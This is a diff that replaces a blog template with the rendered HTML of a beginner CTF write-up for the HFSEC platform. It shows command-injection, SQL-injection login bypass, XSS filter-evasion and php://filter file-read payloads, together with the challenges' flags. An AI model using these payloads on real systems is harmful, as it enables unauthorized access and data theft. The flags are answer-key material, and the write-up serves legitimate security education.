@@ -1,31 +1,220 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>可惜没如果、m0nk3y‘s Blog | 可惜没如果、m0nk3y‘s Blog</title><meta name="author" content="m0nk3y"><meta name="copyright" content="m0nk3y"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="HFSEC Writeup 这个平台的题比较简单,适合新手入门 Web-linux初识linux命令进去是一个ping 127.0.0.1 用linux管道符| ping 127.0.0.1|ls 得到 flag.phpindex.php 然后再 ping 127.0.0.1|cat flag.php 得到flag HFCTF{84B29DA8F42ED3AF4BF098D8FFEE4DC7}">
+<meta property="og:type" content="article">
+<meta property="og:title" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:url" content="https://hack-for.fun/908f.html">
+<meta property="og:site_name" content="可惜没如果、m0nk3y‘s Blog">
+<meta property="og:description" content="HFSEC Writeup 这个平台的题比较简单,适合新手入门 Web-linux初识linux命令进去是一个ping 127.0.0.1 用linux管道符| ping 127.0.0.1|ls 得到 flag.phpindex.php 然后再 ping 127.0.0.1|cat flag.php 得到flag HFCTF{84B29DA8F42ED3AF4BF098D8FFEE4DC7}">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg">
+<meta property="article:published_time" content="2019-12-28T16:00:00.000Z">
+<meta property="article:modified_time" content="2020-08-25T08:45:16.038Z">
+<meta property="article:author" content="m0nk3y">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://hack-for.fun/908f"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: false
+};
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
-        
-    if theme.reward.enable
-      !=partial('includes/post/reward', {}, {cache:theme.fragment_cache})
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .post-ad!=theme.ad.post
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
 
-    include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-08-25 16:45:16'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache:theme.fragment_cache})
-      
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.1.1"><link rel="alternate" href="/atom.xml" title="可惜没如果、m0nk3y‘s Blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="/null" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div></div><hr/></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">可惜没如果、m0nk3y‘s Blog</a></span><span id="menus"><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2019-12-28T16:00:00.000Z" title="Created 2019-12-29 00:00:00">2019-12-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2020-08-25T08:45:16.038Z" title="Updated 2020-08-25 16:45:16">2020-08-25</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Writeup/">Writeup</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><a id="more"></a>
+
+<p>HFSEC Writeup</p>
+<p>这个平台的题比较<strong>简单,适合新手入门</strong></p>
+<h1 id="Web-linux"><a href="#Web-linux" class="headerlink" title="Web-linux"></a>Web-linux</h1><h2 id="初识linux命令"><a href="#初识linux命令" class="headerlink" title="初识linux命令"></a>初识linux命令</h2><p>进去是一个ping 127.0.0.1</p>
+<p>用linux管道符|</p>
+<p>ping 127.0.0.1|ls</p>
+<p>得到</p>
+<p>flag.php<br>index.php</p>
+<p>然后再</p>
+<p>ping 127.0.0.1|cat flag.php 得到flag</p>
+<p>HFCTF{84B29DA8F42ED3AF4BF098D8FFEE4DC7}</p>
+<h2 id="命令执行-simple-bypass"><a href="#命令执行-simple-bypass" class="headerlink" title="命令执行 | simple_bypass"></a>命令执行 | simple_bypass</h2><p>饿…其实第一题的思路已经把第二题做出来了</p>
+<p>HFCTF{E286902D28AC288657881186D4DFD27EFC7A1873}</p>
+<p>出题人给了一个帖子,我也把贴在这里好了</p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/137923.html">浅谈CTF中命令执行与绕过的小技巧</a></p>
+<h1 id="Web-php"><a href="#Web-php" class="headerlink" title="Web-php"></a>Web-php</h1><h2 id="php类型转换的游戏"><a href="#php类型转换的游戏" class="headerlink" title="php类型转换的游戏"></a>php类型转换的游戏</h2><ul>
+<li>正如题目描述那样,利用sha1()函数不能处理数组返回null就成功了</li>
+</ul>
+<p>?foo[]=1&amp;bar[]=2</p>
+<p>HFCTF{2393FC5EFAA4FEDF7AB0E29DBBA51CE4A8DD6F34}</p>
+<h2 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h2><p>/?scan=&amp;file=</p>
+<p>得到</p>
+<p>cookie.txt<br>example.txt<br>flag.php<br>index.php<br>phpinfo.php</p>
+<p>?file=php://filter/read=convert.base64-encode/resource=flag.php</p>
+<p>将所得内容进行base64解码得到flag</p>
+<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="SQL0-SQL基础命令"><a href="#SQL0-SQL基础命令" class="headerlink" title="SQL0 | SQL基础命令"></a>SQL0 | SQL基础命令</h2><p>SELECT flag FORM flag</p>
+<p>HFCTF{E6A69A7BF46C8DC259C5BD69CE9577B4}</p>
+<h2 id="SQL1-任意登陆"><a href="#SQL1-任意登陆" class="headerlink" title="SQL1 | 任意登陆"></a>SQL1 | 任意登陆</h2><p>构造用户名为 1’ or 1=1# 密码随便 登录就拿到flag</p>
+<h2 id="SQL2-登陆伪造"><a href="#SQL2-登陆伪造" class="headerlink" title="SQL2 | 登陆伪造"></a>SQL2 | 登陆伪造</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$user = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">$pass = md5($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">$sql = <span class="string">&quot;SELECT * FROM user WHERE username = &#x27;$user&#x27; AND password = &#x27;$pass&#x27;, $link&quot;</span>;</span><br><span class="line">$result=mysql_fetch_array($sql);</span><br><span class="line"><span class="keyword">if</span>($result[<span class="string">&#x27;username&#x27;</span>] === <span class="string">&#x27;root&#x27;</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&#x27;HFCTF&#123;****************************&#125;&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在按照第一题的做法后给出了一篇教学文章,并且给出了源码</p>
+<p><a target="_blank" rel="noopener" href="http://111.230.11.183:44444/basic_skills/sql/PXWEFKMYXXVAQBFGPYRFUSSKDJJNILRB.html">教学文章</a></p>
+<p>按照文章教学的做就出来了</p>
+<p>先用</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#39; or 1&#x3D;2 UNION SELECT &#39;root&#39;,&#39;root&#39;#</span><br></pre></td></tr></table></figure>
+
+<p>因为’1’ 然后 or 1=2 为假,前面的查询语句就没有结果,然后后面UNION SELECT ‘root’,’root’#</p>
+<p>就会创建一个新的字段在 username和password字段中</p>
+<p>HFCTF{A9F2A0E2C0B9B9F9B4C0D8C5D0E9E3E1}      </p>
+<h2 id="XSS1-简单弹框"><a href="#XSS1-简单弹框" class="headerlink" title="XSS1 | 简单弹框"></a>XSS1 | 简单弹框</h2><p>构造</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>弹窗后得到flag</p>
+<h2 id="XSS3-一点点过滤"><a href="#XSS3-一点点过滤" class="headerlink" title="XSS3 | 一点点过滤"></a>XSS3 | 一点点过滤</h2><ul>
+<li>过滤：script</li>
+<li>过滤：on</li>
+<li>替换：alert =&gt; * * * * *</li>
+</ul>
+<p>将aler进行HTML编码</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span></span><br></pre></td></tr></table></figure>
+
+<p>提交后得到alert(1)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&amp;#x3c;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3e;</span><span class="symbol">&amp;#x61;</span><span class="symbol">&amp;#x6c;</span><span class="symbol">&amp;#x65;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x28;</span><span class="symbol">&amp;#x31;</span><span class="symbol">&amp;#x29;</span><span class="symbol">&amp;#x3c;</span><span class="symbol">&amp;#x2f;</span><span class="symbol">&amp;#x73;</span><span class="symbol">&amp;#x63;</span><span class="symbol">&amp;#x72;</span><span class="symbol">&amp;#x69;</span><span class="symbol">&amp;#x70;</span><span class="symbol">&amp;#x74;</span><span class="symbol">&amp;#x3e;</span></span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(<span class="number">1</span>)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>但是并没有弹窗</p>
+<h2 id="备份的艺术"><a href="#备份的艺术" class="headerlink" title="备份的艺术"></a>备份的艺术</h2><p>.index.php.swp</p>
+<p>打开搜索flag</p>
+<h2 id="JS-aaencode"><a href="#JS-aaencode" class="headerlink" title="JS aaencode"></a>JS aaencode</h2><p><a target="_blank" rel="noopener" href="http://ctf.ssleye.com/aaencode.html">http://ctf.ssleye.com/aaencode.html</a></p>
+<p>在这里解开了行了</p>
+<h2 id="HTTP-check-header"><a href="#HTTP-check-header" class="headerlink" title="HTTP | check header"></a>HTTP | check header</h2><p><img src="https://i.loli.net/2019/12/29/l4ATQHS8mwpzZEh.png" alt="1.png"></p>
+<p>当然也可以用抓包</p>
+<h2 id="SQL3-数据获取"><a href="#SQL3-数据获取" class="headerlink" title="SQL3 | 数据获取"></a>SQL3 | 数据获取</h2><p>直接用sqlmap就可以跑出来</p>
+<p><img src="https://i.loli.net/2019/12/29/Z4cU8fsBmHxNEei.png" alt="2.png"></p>
+<p>继续使用查表和查字段的命令</p>
+<p>得到表为user,字段为username和password</p>
+<p>最后得到flag</p>
+<p>HFCTF{40356E66E78BB1DC1EFBC04FA4336F59}</p>
+<h2 id="HTTP-重定向"><a href="#HTTP-重定向" class="headerlink" title="HTTP | 重定向"></a>HTTP | 重定向</h2><p>抓包,注意改URL</p>
+<p><img src="https://i.loli.net/2019/12/29/OSI7RZg1t6o5Cah.png" alt="3.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/908f.html">https://hack-for.fun/908f.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/5ed7.html"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/f653.html"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info"></div></div></a></div></nav></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" src="/null" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">m0nk3y</div><div class="author-info__description"></div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">97</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">81</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">22</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>Announcement</span></div><div class="announcement_content">This is my Blog</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-linux"><span class="toc-number">1.</span> <span class="toc-text">Web-linux</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%9D%E8%AF%86linux%E5%91%BD%E4%BB%A4"><span class="toc-number">1.1.</span> <span class="toc-text">初识linux命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C-simple-bypass"><span class="toc-number">1.2.</span> <span class="toc-text">命令执行 | simple_bypass</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-php"><span class="toc-number">2.</span> <span class="toc-text">Web-php</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E7%B1%BB%E5%9E%8B%E8%BD%AC%E6%8D%A2%E7%9A%84%E6%B8%B8%E6%88%8F"><span class="toc-number">2.1.</span> <span class="toc-text">php类型转换的游戏</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB-RFI"><span class="toc-number">2.2.</span> <span class="toc-text">远程文件包含(RFI)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">3.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL0-SQL%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4"><span class="toc-number">3.1.</span> <span class="toc-text">SQL0 | SQL基础命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL1-%E4%BB%BB%E6%84%8F%E7%99%BB%E9%99%86"><span class="toc-number">3.2.</span> <span class="toc-text">SQL1 | 任意登陆</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL2-%E7%99%BB%E9%99%86%E4%BC%AA%E9%80%A0"><span class="toc-number">3.3.</span> <span class="toc-text">SQL2 | 登陆伪造</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS1-%E7%AE%80%E5%8D%95%E5%BC%B9%E6%A1%86"><span class="toc-number">3.4.</span> <span class="toc-text">XSS1 | 简单弹框</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS3-%E4%B8%80%E7%82%B9%E7%82%B9%E8%BF%87%E6%BB%A4"><span class="toc-number">3.5.</span> <span class="toc-text">XSS3 | 一点点过滤</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%87%E4%BB%BD%E7%9A%84%E8%89%BA%E6%9C%AF"><span class="toc-number">3.6.</span> <span class="toc-text">备份的艺术</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#JS-aaencode"><span class="toc-number">3.7.</span> <span class="toc-text">JS aaencode</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-check-header"><span class="toc-number">3.8.</span> <span class="toc-text">HTTP | check header</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SQL3-%E6%95%B0%E6%8D%AE%E8%8E%B7%E5%8F%96"><span class="toc-number">3.9.</span> <span class="toc-text">SQL3 | 数据获取</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E9%87%8D%E5%AE%9A%E5%90%91"><span class="toc-number">3.10.</span> <span class="toc-text">HTTP | 重定向</span></a></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Post</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2986.html" title="Recent arrangements"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Recent arrangements"/></a><div class="content"><a class="title" href="/2986.html" title="Recent arrangements">Recent arrangements</a><time datetime="2099-11-01T04:00:00.000Z" title="Created 2099-11-01 12:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/9b1d.html" title="No title"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="No title"/></a><div class="content"><a class="title" href="/9b1d.html" title="No title">No title</a><time datetime="2099-10-31T16:00:00.000Z" title="Created 2099-11-01 00:00:00">2099-11-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/62d1.html" title="Chrome 浏览器扩展开发初试"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Chrome 浏览器扩展开发初试"/></a><div class="content"><a class="title" href="/62d1.html" title="Chrome 浏览器扩展开发初试">Chrome 浏览器扩展开发初试</a><time datetime="2020-11-07T05:04:25.000Z" title="Created 2020-11-07 13:04:25">2020-11-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/558a.html" title="Cobalt Strike"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Cobalt Strike"/></a><div class="content"><a class="title" href="/558a.html" title="Cobalt Strike">Cobalt Strike</a><time datetime="2020-11-04T13:33:44.000Z" title="Created 2020-11-04 21:33:44">2020-11-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/abc8.html" title="2020小组招新有感"><img src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="2020小组招新有感"/></a><div class="content"><a class="title" href="/abc8.html" title="2020小组招新有感">2020小组招新有感</a><time datetime="2020-10-23T16:56:04.000Z" title="Created 2020-10-24 00:56:04">2020-10-24</time></div></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 By m0nk3y</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Read Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Switch Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><div class="js-pjax"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></div></body></html>
